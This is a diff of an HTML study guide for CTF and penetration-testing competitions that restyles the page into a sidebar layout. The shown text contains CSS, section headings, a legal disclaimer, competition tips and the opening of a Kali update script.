@@ -3,980 +3,2212 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF & Penetration Testing - Complete Guide</title>
+    <title>Ultimate CTF & Penetration Testing Guide</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #00ff88;
+            --secondary: #0096ff;
+            --danger: #ff6432;
+            --warning: #ffdd57;
+            --info: #00d4ff;
+            --dark-bg: #0c0c2e;
+            --medium-bg: #1a1a3e;
+            --light-bg: #2a2a5a;
+            --text-light: #e0e0ff;
+            --text-muted: #a0a0b0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            color: #e0e0e0;
+            background: var(--dark-bg);
+            color: var(--text-light);
             line-height: 1.6;
-            padding: 20px;
+            display: flex;
             min-height: 100vh;
         }
         
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            background: rgba(30, 30, 50, 0.95);
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            overflow: hidden;
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #0f3460 0%, #16213e 100%);
-            padding: 30px;
-            border-bottom: 3px solid #00ff88;
-        }
-        
-        .header h1 {
-            color: #00ff88;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
-        }
-        
-        .header p {
-            color: #a0a0b0;
-            font-size: 1.1em;
-        }
-        
-        .nav-tabs {
-            display: flex;
-            background: rgba(20, 20, 35, 0.8);
-            border-bottom: 2px solid #00ff88;
-            overflow-x: auto;
-            flex-wrap: wrap;
-        }
-        
-        .nav-tab {
-            padding: 15px 30px;
-            cursor: pointer;
-            border: none;
-            background: transparent;
-            color: #a0a0b0;
-            font-size: 1em;
-            transition: all 0.3s ease;
-            border-bottom: 3px solid transparent;
-            white-space: nowrap;
-        }
-        
-        .nav-tab:hover {
-            background: rgba(0, 255, 136, 0.1);
-            color: #00ff88;
-        }
-        
-        .nav-tab.active {
-            color: #00ff88;
-            border-bottom-color: #00ff88;
-            background: rgba(0, 255, 136, 0.05);
-        }
-        
-        .content {
-            padding: 30px;
-            max-height: calc(100vh - 300px);
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 300px;
+            background: var(--medium-bg);
+            border-right: 2px solid var(--primary);
+            padding: 20px 0;
             overflow-y: auto;
+            position: fixed;
+            height: 100vh;
+            z-index: 100;
         }
         
-        .content::-webkit-scrollbar { width: 10px; }
-        .content::-webkit-scrollbar-track { background: rgba(20, 20, 35, 0.5); }
-        .content::-webkit-scrollbar-thumb { background: rgba(0, 255, 136, 0.3); border-radius: 5px; }
-        
-        .tab-content { display: none; }
-        .tab-content.active { display: block; animation: fadeIn 0.4s ease; }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .phase-header {
-            background: linear-gradient(135deg, #0f3460 0%, #1a4d7a 100%);
-            padding: 20px;
-            border-radius: 8px;
+        .sidebar-header {
+            padding: 0 20px 20px;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.2);
             margin-bottom: 20px;
-            border-left: 5px solid #00ff88;
         }
         
-        .phase-header h2 {
-            color: #00ff88;
-            font-size: 1.8em;
+        .sidebar-header h2 {
+            color: var(--primary);
+            font-size: 1.4rem;
             margin-bottom: 5px;
         }
         
-        .phase-description {
-            color: #c0c0d0;
-            font-size: 1em;
-            margin-top: 10px;
+        .sidebar-header p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
         }
         
-        .warning-box {
-            background: rgba(255, 100, 50, 0.1);
-            border-left: 4px solid #ff6432;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
+        .nav-section {
+            margin-bottom: 25px;
+            padding: 0 20px;
         }
         
-        .warning-box p {
-            color: #ffaa88;
-            margin: 5px 0;
+        .nav-section h3 {
+            color: var(--secondary);
+            font-size: 0.95rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.1);
         }
         
-        .warning-icon {
-            color: #ff6432;
-            font-weight: bold;
-            margin-right: 5px;
-        }
-        
-        .accordion {
-            margin-bottom: 15px;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid rgba(0, 255, 136, 0.2);
-        }
-        
-        .accordion-header {
-            background: linear-gradient(135deg, rgba(30, 50, 70, 0.9) 0%, rgba(20, 40, 60, 0.9) 100%);
-            padding: 18px 25px;
-            cursor: pointer;
+        .nav-item {
             display: flex;
             align-items: center;
+            padding: 10px 15px;
+            color: var(--text-muted);
+            text-decoration: none;
+            border-radius: 5px;
+            margin-bottom: 3px;
             transition: all 0.3s ease;
-            border-bottom: 1px solid rgba(0, 255, 136, 0.2);
+            cursor: pointer;
+            font-size: 0.95rem;
         }
         
-        .accordion-header:hover {
-            background: linear-gradient(135deg, rgba(40, 60, 80, 0.9) 0%, rgba(30, 50, 70, 0.9) 100%);
+        .nav-item:hover {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
         }
         
-        .accordion-header.active {
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.15) 0%, rgba(0, 180, 100, 0.15) 100%);
+        .nav-item.active {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--primary);
+            border-left: 3px solid var(--primary);
         }
         
-        .accordion-icon {
-            color: #00ff88;
-            margin-right: 15px;
-            font-size: 1.2em;
-            transition: transform 0.3s ease;
+        .nav-icon {
+            margin-right: 10px;
+            font-size: 1.1rem;
             width: 20px;
+            text-align: center;
         }
         
-        .accordion-header.active .accordion-icon {
-            transform: rotate(90deg);
+        .sub-nav {
+            padding-left: 30px;
+            margin-top: 5px;
+            display: none;
         }
         
-        .accordion-title {
-            flex: 1;
-            color: #00ff88;
-            font-size: 1.1em;
+        .nav-item.has-subnav.active + .sub-nav {
+            display: block;
+        }
+        
+        .sub-nav-item {
+            padding: 8px 15px;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .sub-nav-item:hover {
+            color: var(--info);
+        }
+        
+        .sub-nav-item.active {
+            color: var(--info);
             font-weight: 500;
         }
         
-        .accordion-badge {
-            background: rgba(0, 255, 136, 0.2);
-            color: #00ff88;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.85em;
-            margin-left: 10px;
-        }
-        
-        .accordion-content {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.4s ease;
-            background: rgba(20, 30, 45, 0.6);
-        }
-        
-        .accordion-content.active {
-            max-height: 8000px;
-        }
-        
-        .accordion-body {
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            margin-left: 300px;
             padding: 25px;
+            max-width: calc(100% - 300px);
+            padding-bottom: 50px;
         }
         
-        .tool-section {
-            margin-bottom: 25px;
+        .content-header {
+            background: linear-gradient(135deg, var(--medium-bg), var(--light-bg));
+            padding: 30px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border-left: 5px solid var(--primary);
         }
         
-        .tool-section h4 {
-            color: #00d4ff;
-            margin-bottom: 12px;
-            font-size: 1.15em;
-            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
-            padding-bottom: 8px;
+        .content-header h1 {
+            color: var(--primary);
+            font-size: 2.3rem;
+            margin-bottom: 10px;
         }
         
-        .code-block {
-            background: #1a1a2e;
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            border-radius: 6px;
-            padding: 15px;
-            margin: 10px 0;
-            overflow-x: auto;
-            position: relative;
+        .content-header p {
+            color: var(--text-muted);
+            font-size: 1.1rem;
         }
         
-        .code-block pre {
-            margin: 0;
-            color: #00ff88;
-            font-family: 'Courier New', monospace;
-            font-size: 0.95em;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+        /* Accordion System */
+        .content-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
         }
         
-        .code-label {
-            color: #00d4ff;
-            font-size: 0.85em;
-            margin-bottom: 8px;
+        .content-section.active {
             display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .section-header {
+            background: var(--light-bg);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--secondary);
+        }
+        
+        .section-header h2 {
+            color: var(--secondary);
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+        
+        .section-header p {
+            color: var(--text-muted);
+        }
+        
+        /* Master Accordion System */
+        .master-accordion {
+            margin-bottom: 20px;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            background: var(--medium-bg);
+        }
+        
+        .master-accordion-header {
+            padding: 20px 25px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.3s ease;
+            background: rgba(40, 50, 70, 0.7);
+        }
+        
+        .master-accordion-header:hover {
+            background: rgba(50, 60, 80, 0.7);
+        }
+        
+        .master-accordion-title {
+            display: flex;
+            align-items: center;
+            color: var(--primary);
+            font-size: 1.2rem;
             font-weight: 600;
         }
         
-        .command { color: #ffdd57; }
-        .output { color: #a0a0b0; }
-        
-        .description {
-            color: #c0c0d0;
-            margin: 10px 0;
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 5px;
-            border-left: 3px solid #00d4ff;
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 36px;
+            height: 36px;
+            background: var(--primary);
+            color: var(--dark-bg);
+            border-radius: 50%;
+            font-weight: bold;
+            margin-right: 15px;
+            font-size: 1rem;
         }
         
-        .info-box {
-            background: rgba(0, 150, 255, 0.1);
-            border-left: 4px solid #0096ff;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 5px;
+        .master-accordion-badge {
+            background: rgba(255, 100, 50, 0.2);
+            color: var(--danger);
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-left: 10px;
         }
         
-        .info-box p, .info-box ul {
-            color: #88ccff;
-            margin: 5px 0;
+        .master-accordion-icon {
+            color: var(--primary);
+            transition: transform 0.3s ease;
         }
         
-        .success-box {
-            background: rgba(0, 255, 136, 0.1);
-            border-left: 4px solid #00ff88;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 5px;
+        .master-accordion.open .master-accordion-icon {
+            transform: rotate(180deg);
         }
         
-        .success-box p {
-            color: #88ffbb;
-            margin: 5px 0;
+        .master-accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease;
+            background: rgba(20, 30, 45, 0.6);
         }
         
+        .master-accordion.open .master-accordion-content {
+            max-height: 5000px;
+        }
+        
+        .master-accordion-body {
+            padding: 30px;
+        }
+        
+        /* Nested Accordion System */
+        .nested-accordion {
+            margin: 20px 0;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .nested-accordion-header {
+            padding: 18px 20px;
+            background: rgba(30, 40, 60, 0.8);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: var(--info);
+            font-weight: 600;
+        }
+        
+        .nested-accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease;
+        }
+        
+        .nested-accordion.open .nested-accordion-content {
+            max-height: 5000px;
+        }
+        
+        .nested-accordion-body {
+            padding: 20px;
+            background: rgba(20, 25, 35, 0.5);
+        }
+        
+        /* Tool Cards */
         .tool-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 15px;
-            margin: 15px 0;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
         }
         
         .tool-card {
-            background: rgba(30, 50, 70, 0.5);
-            padding: 15px;
+            background: var(--light-bg);
             border-radius: 8px;
+            padding: 20px;
             border: 1px solid rgba(0, 255, 136, 0.2);
             transition: all 0.3s ease;
         }
         
         .tool-card:hover {
-            transform: translateY(-3px);
-            border-color: #00ff88;
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.2);
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
         
-        .tool-card h5 {
-            color: #00ff88;
-            margin-bottom: 8px;
-            font-size: 1.1em;
+        .tool-card h4 {
+            color: var(--primary);
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .tool-card h4 i {
+            margin-right: 10px;
         }
         
         .tool-card p {
-            color: #a0a0b0;
-            font-size: 0.9em;
-            margin-bottom: 10px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 15px;
         }
         
-        ul {
-            list-style: none;
-            padding-left: 0;
+        /* Code Blocks */
+        .code-container {
+            background: rgba(20, 20, 35, 0.9);
+            border-radius: 6px;
+            margin: 15px 0;
+            border-left: 4px solid var(--primary);
+            overflow: hidden;
         }
         
-        ul li {
-            padding: 8px 0;
-            padding-left: 25px;
-            position: relative;
-            color: #c0c0d0;
+        .code-header {
+            background: rgba(40, 40, 60, 0.8);
+            padding: 12px 15px;
+            color: var(--secondary);
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         
-        ul li:before {
-            content: "▹";
-            color: #00ff88;
-            position: absolute;
-            left: 0;
-            font-size: 1.2em;
+        .code-content {
+            padding: 15px;
+            overflow-x: auto;
         }
         
-        .gtfobins-link {
-            display: inline-block;
-            background: rgba(255, 100, 50, 0.2);
-            color: #ffaa88;
-            padding: 8px 15px;
-            border-radius: 5px;
-            text-decoration: none;
-            margin: 10px 0;
-            border: 1px solid #ff6432;
+        .code-content pre {
+            margin: 0;
+            color: var(--primary);
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .copy-btn {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            padding: 5px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85rem;
             transition: all 0.3s ease;
         }
         
-        .gtfobins-link:hover {
-            background: rgba(255, 100, 50, 0.3);
-            transform: translateX(5px);
+        .copy-btn:hover {
+            background: rgba(0, 255, 136, 0.2);
         }
         
-        .footer {
-            background: rgba(20, 20, 35, 0.8);
-            padding: 20px;
-            text-align: center;
-            color: #a0a0b0;
-            border-top: 2px solid #00ff88;
+        /* Alert Boxes */
+        .alert {
+            padding: 18px;
+            border-radius: 6px;
+            margin: 20px 0;
+            border-left: 4px solid;
         }
         
-        .privilege-card {
-            background: rgba(40, 60, 80, 0.5);
+        .alert-warning {
+            background: rgba(255, 100, 50, 0.1);
+            border-color: var(--danger);
+            color: #ffaa88;
+        }
+        
+        .alert-info {
+            background: rgba(0, 150, 255, 0.1);
+            border-color: var(--secondary);
+            color: #88ccff;
+        }
+        
+        .alert-success {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: var(--primary);
+            color: #88ffbb;
+        }
+        
+        .alert-note {
+            background: rgba(255, 221, 87, 0.1);
+            border-color: var(--warning);
+            color: #ffeeaa;
+        }
+        
+        /* Step Cards */
+        .step-card {
+            background: rgba(40, 50, 70, 0.5);
             padding: 20px;
             border-radius: 8px;
-            border-left: 4px solid #00ff88;
-            margin-bottom: 20px;
+            margin: 15px 0;
+            border-left: 4px solid var(--info);
         }
         
-        .privilege-card h4 {
-            color: #00ff88;
-            margin-bottom: 15px;
-            font-size: 1.2em;
+        .step-card h5 {
+            color: var(--info);
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+        
+        /* Reference Grid */
+        .reference-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .reference-item {
+            background: rgba(40, 40, 60, 0.6);
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+        }
+        
+        .reference-item h6 {
+            color: var(--info);
+            margin-bottom: 8px;
+            font-size: 1rem;
+        }
+        
+        .reference-item a {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+        
+        .reference-item a:hover {
+            color: var(--primary);
+            text-decoration: underline;
+        }
+        
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 6px;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+            padding: 15px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.1);
+            color: var(--text-muted);
+        }
+        
+        tr:hover {
+            background: rgba(0, 255, 136, 0.05);
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid var(--light-bg);
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .sidebar {
+                width: 250px;
+            }
+            
+            .main-content {
+                margin-left: 250px;
+                max-width: calc(100% - 250px);
+            }
+            
+            .tool-grid {
+                grid-template-columns: 1fr;
+            }
         }
         
         @media (max-width: 768px) {
-            .header h1 { font-size: 1.8em; }
-            .nav-tab { padding: 12px 20px; font-size: 0.9em; }
-            .content { padding: 15px; }
-            .tool-grid { grid-template-columns: 1fr; }
+            body {
+                flex-direction: column;
+            }
+            
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: static;
+                border-right: none;
+                border-bottom: 2px solid var(--primary);
+                max-height: 300px;
+            }
+            
+            .main-content {
+                margin-left: 0;
+                max-width: 100%;
+                padding: 20px;
+            }
+        }
+        
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--medium-bg);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc77;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🛡️ CTF & Penetration Testing - Complete Guide</h1>
-            <p>Comprehensive guide for Web Vulnerability Scanning, Exploitation & Linux Privilege Escalation (India Skills Compatible)</p>
+    <!-- Sidebar Navigation -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h2>🔐 Ultimate CTF & PenTest Guide</h2>
+            <p>Complete Toolkit for India Skills</p>
         </div>
-
-        <div class="nav-tabs">
-            <button class="nav-tab active" onclick="switchTab(event, 'intro')">🏠 Introduction</button>
-            <button class="nav-tab" onclick="switchTab(event, 'recon')">🔍 Reconnaissance</button>
-            <button class="nav-tab" onclick="switchTab(event, 'webvuln')">🌐 Web Vulnerabilities</button>
-            <button class="nav-tab" onclick="switchTab(event, 'privesc')">🔓 Linux PrivEsc</button>
-            <button class="nav-tab" onclick="switchTab(event, 'tools')">🛠️ Tools & Resources</button>
+        
+        <div class="nav-section">
+            <h3>🏠 INTRODUCTION</h3>
+            <div class="nav-item active" data-target="intro">
+                <i class="fas fa-home nav-icon"></i>
+                <span>Welcome Guide</span>
+            </div>
+            <div class="nav-item" data-target="foundation">
+                <i class="fas fa-layer-group nav-icon"></i>
+                <span>Foundation Setup</span>
+            </div>
         </div>
-
-        <div class="content">
-            <!-- INTRODUCTION TAB -->
-            <div id="intro" class="tab-content active">
-                <div class="phase-header">
-                    <h2>📚 Welcome to the Complete CTF & Penetration Testing Guide</h2>
-                    <p class="phase-description">Your comprehensive resource for mastering penetration testing and CTF competitions, specifically designed for India Skills competitions.</p>
+        
+        <div class="nav-section">
+            <h3>🔍 RECONNAISSANCE</h3>
+            <div class="nav-item has-subnav" data-target="recon">
+                <i class="fas fa-search nav-icon"></i>
+                <span>Reconnaissance Tools</span>
+            </div>
+            <div class="sub-nav">
+                <div class="sub-nav-item" data-target="nmap">Nmap Guide</div>
+                <div class="sub-nav-item" data-target="gobuster">Gobuster & FFuF</div>
+                <div class="sub-nav-item" data-target="subdomain">Subdomain Discovery</div>
+                <div class="sub-nav-item" data-target="nikto">Nikto & WhatWeb</div>
+                <div class="sub-nav-item" data-target="katana">Katana Crawler</div>
+            </div>
+        </div>
+        
+        <div class="nav-section">
+            <h3>🌐 WEB VULNERABILITIES</h3>
+            <div class="nav-item has-subnav" data-target="web-vuln">
+                <i class="fas fa-bug nav-icon"></i>
+                <span>Web Exploitation</span>
+            </div>
+            <div class="sub-nav">
+                <div class="sub-nav-item" data-target="sqli">SQL Injection</div>
+                <div class="sub-nav-item" data-target="xss">XSS Attacks</div>
+                <div class="sub-nav-item" data-target="idor">IDOR Testing</div>
+                <div class="sub-nav-item" data-target="lfi-rfi">LFI/RFI Attacks</div>
+                <div class="sub-nav-item" data-target="file-upload">File Upload Vulns</div>
+                <div class="sub-nav-item" data-target="cmd-injection">Command Injection</div>
+                <div class="sub-nav-item" data-target="burp-guide">Burp Suite Guide</div>
+            </div>
+        </div>
+        
+        <div class="nav-section">
+            <h3>🔓 PRIVILEGE ESCALATION</h3>
+            <div class="nav-item has-subnav" data-target="privesc">
+                <i class="fas fa-user-secret nav-icon"></i>
+                <span>Linux PrivEsc</span>
+            </div>
+            <div class="sub-nav">
+                <div class="sub-nav-item" data-target="sudo-privesc">SUDO Exploitation</div>
+                <div class="sub-nav-item" data-target="suid-privesc">SUID/SGID Binaries</div>
+                <div class="sub-nav-item" data-target="capabilities">Linux Capabilities</div>
+                <div class="sub-nav-item" data-target="cron-jobs">Cron Jobs</div>
+                <div class="sub-nav-item" data-target="path-hijack">PATH Hijacking</div>
+                <div class="sub-nav-item" data-target="nfs-exploit">NFS Exploitation</div>
+                <div class="sub-nav-item" data-target="kernel-exploits">Kernel Exploits</div>
+                <div class="sub-nav-item" data-target="win-privesc">Windows PrivEsc</div>
+            </div>
+        </div>
+        
+        <div class="nav-section">
+            <h3>🛠️ TOOLS & RESOURCES</h3>
+            <div class="nav-item" data-target="tools">
+                <i class="fas fa-tools nav-icon"></i>
+                <span>Essential Tools</span>
+            </div>
+            <div class="nav-item" data-target="wordlists">
+                <i class="fas fa-list nav-icon"></i>
+                <span>Wordlists & Payloads</span>
+            </div>
+            <div class="nav-item" data-target="resources">
+                <i class="fas fa-link nav-icon"></i>
+                <span>Useful Resources</span>
+            </div>
+        </div>
+        
+        <div class="nav-section">
+            <h3>🛡️ HARDENING GUIDES</h3>
+            <div class="nav-item has-subnav" data-target="hardening">
+                <i class="fas fa-shield-alt nav-icon"></i>
+                <span>System Hardening</span>
+            </div>
+            <div class="sub-nav">
+                <div class="sub-nav-item" data-target="linux-hardening">Linux Hardening</div>
+                <div class="sub-nav-item" data-target="ssh-hardening">SSH Security</div>
+                <div class="sub-nav-item" data-target="apache-nginx">Apache/Nginx Hardening</div>
+                <div class="sub-nav-item" data-target="windows-hardening">Windows Hardening</div>
+                <div class="sub-nav-item" data-target="iis-hardening">IIS Security</div>
+            </div>
+        </div>
+        
+        <div class="nav-section">
+            <h3>⚡ QUICK REFERENCE</h3>
+            <div class="nav-item" onclick="showCheatsheet()">
+                <i class="fas fa-clipboard-list nav-icon"></i>
+                <span>Cheatsheet</span>
+            </div>
+            <div class="nav-item" onclick="showPractice()">
+                <i class="fas fa-flask nav-icon"></i>
+                <span>Practice Platforms</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content Area -->
+    <div class="main-content">
+        <!-- Introduction Section -->
+        <div class="content-section active" id="intro">
+            <div class="content-header">
+                <h1>🎯 Ultimate CTF & Penetration Testing Guide</h1>
+                <p>Comprehensive toolkit for India Skills competitions, CTF events, and professional penetration testing</p>
+            </div>
+            
+            <div class="alert alert-warning">
+                <strong><i class="fas fa-exclamation-triangle"></i> LEGAL DISCLAIMER:</strong> This guide is for educational purposes only. Always obtain proper authorization before testing systems. Unauthorized access is illegal.
+            </div>
+            
+            <div class="section-header">
+                <h2><i class="fas fa-graduation-cap"></i> How to Use This Guide</h2>
+                <p>Follow these steps to maximize your learning experience</p>
+            </div>
+            
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <h4><i class="fas fa-list-ol"></i> Step-by-Step Learning</h4>
+                    <p>Each section follows a numbered approach. Complete each step before moving to the next.</p>
                 </div>
-
-                <div class="info-box">
-                    <p><strong>What's Covered in This Guide:</strong></p>
-                    <ul>
-                        <li><strong>Reconnaissance:</strong> Nmap, Gobuster, Katana, Ffuf, and more scanning tools</li>
-                        <li><strong>Web Vulnerabilities:</strong> SQL Injection, XSS, IDOR, LFI/RFI, Command Injection, File Upload</li>
-                        <li><strong>Linux Privilege Escalation:</strong> SUDO, SUID, Capabilities, Cron Jobs, PATH, NFS, Kernel Exploits</li>
-                        <li><strong>Tools & Resources:</strong> Complete toolkit list, wordlists, and reference sites</li>
-                    </ul>
+                <div class="tool-card">
+                    <h4><i class="fas fa-hands"></i> Hands-On Practice</h4>
+                    <p>Use the provided commands in controlled environments. Practice makes perfect.</p>
                 </div>
-
-                <div class="warning-box">
-                    <p><span class="warning-icon">⚠️</span> <strong>LEGAL DISCLAIMER:</strong></p>
-                    <p><span class="warning-icon">⚠️</span> Only use these techniques on authorized systems, CTF platforms, and your own test environments</p>
-                    <p><span class="warning-icon">⚠️</span> Unauthorized access to computer systems is illegal and punishable by law</p>
-                    <p><span class="warning-icon">⚠️</span> Always get written permission before conducting security testing</p>
-                    <p><span class="warning-icon">⚠️</span> This guide is for educational purposes only</p>
+                <div class="tool-card">
+                    <h4><i class="fas fa-book"></i> Take Detailed Notes</h4>
+                    <p>Document commands, findings, and methodologies. Notes are crucial for competitions.</p>
                 </div>
-
-                <div class="tool-section">
-                    <h4>🎯 How to Use This Guide</h4>
-                    <div class="description">
-                        <ol style="padding-left: 20px;">
-                            <li style="padding-left: 0;"><strong>Start with Reconnaissance</strong> - Learn to discover and enumerate targets</li>
-                            <li style="padding-left: 0;"><strong>Study Web Vulnerabilities</strong> - Understand common web application weaknesses</li>
-                            <li style="padding-left: 0;"><strong>Master Privilege Escalation</strong> - Learn to gain root access on Linux systems</li>
-                            <li style="padding-left: 0;"><strong>Build Your Toolkit</strong> - Install and practice with all essential tools</li>
-                            <li style="padding-left: 0;"><strong>Practice, Practice, Practice!</strong> - Use platforms like HackTheBox, TryHackMe, and PicoCTF</li>
-                        </ol>
+                <div class="tool-card">
+                    <h4><i class="fas fa-sync-alt"></i> Regular Practice</h4>
+                    <p>Consistent practice on platforms like HackTheBox and TryHackMe is essential.</p>
+                </div>
+            </div>
+            
+            <div class="section-header">
+                <h2><i class="fas fa-trophy"></i> India Skills Competition Tips</h2>
+                <p>Strategies specifically for India Skills cybersecurity competitions</p>
+            </div>
+            
+            <div class="step-card">
+                <h5>🕒 Time Management Strategy</h5>
+                <ul>
+                    <li>Allocate time: 40% reconnaissance, 40% exploitation, 20% documentation</li>
+                    <li>Set time limits for each challenge (max 30-45 minutes per challenge)</li>
+                    <li>If stuck for 15 minutes, move to next challenge and return later</li>
+                    <li>Keep 30 minutes at the end for review and cleanup</li>
+                </ul>
+            </div>
+            
+            <div class="step-card">
+                <h5>📋 Documentation Checklist</h5>
+                <ul>
+                    <li>Record all commands used (with timestamps)</li>
+                    <li>Screenshot all findings and flags</li>
+                    <li>Document methodology step-by-step</li>
+                    <li>Keep organized folders for each challenge</li>
+                    <li>Write clear explanations for judges</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Foundation Setup -->
+        <div class="content-section" id="foundation">
+            <div class="content-header">
+                <h1>🖥️ Foundation Setup & Environment</h1>
+                <p>Setting up the perfect penetration testing environment</p>
+            </div>
+            
+            <div class="master-accordion open">
+                <div class="master-accordion-header">
+                    <div class="master-accordion-title">
+                        <span class="step-number">1.1</span>
+                        Kali Linux Complete Setup
                     </div>
+                    <i class="fas fa-chevron-down master-accordion-icon"></i>
                 </div>
+                <div class="master-accordion-content">
+                    <div class="master-accordion-body">
+                        <div class="code-container">
+                            <div class="code-header">
+                                <span>Kali Linux Installation Script</span>
+                                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                            </div>
+                            <div class="code-content">
+                                <pre>#!/bin/bash
+# Complete Kali Linux Setup for CTF & PenTesting
 
-                <div class="success-box">
-                    <p><strong>✅ Key Success Tips:</strong></p>
-                    <ul>
-                        <li>Always enumerate thoroughly before attacking</li>
-                        <li>Take detailed notes of everything you discover</li>
-                        <li>Save all scan results and commands you run</li>
-                        <li>When stuck, use GTFOBins.org for binary exploitation ideas</li>
-                        <li>Learn to read documentation and tool output carefully</li>
-                        <li>Practice on legal platforms regularly</li>
-                        <li>Join CTF communities and learn from others</li>
-                    </ul>
-                </div>
+echo "[*] Updating Kali Linux..."
+sudo apt update && sudo apt full-upgrade -y
+sudo apt autoremove -y
 
-                <div class="tool-section">
-                    <h4>🌟 Essential Resources</h4>
-                    <div class="tool-grid">
